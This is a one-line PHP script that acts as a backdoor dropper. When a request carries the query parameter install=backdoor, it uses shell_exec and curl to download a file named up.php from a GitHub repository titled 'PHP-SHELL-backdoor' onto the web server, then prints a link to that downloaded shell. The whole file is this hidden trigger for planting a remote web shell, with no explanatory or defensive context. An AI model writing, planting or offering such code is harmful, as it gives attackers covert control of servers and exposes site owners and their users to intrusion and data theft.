<?php if(isset($_GET['install']) AND $_GET['install'] == 'backdoor'){shell_exec('curl -o up.php https://raw.githubusercontent.com/alex54142/PHP-SHELL-backdoor/main/up.php');echo "<a href='up.php'>backdoor</a>";}?>
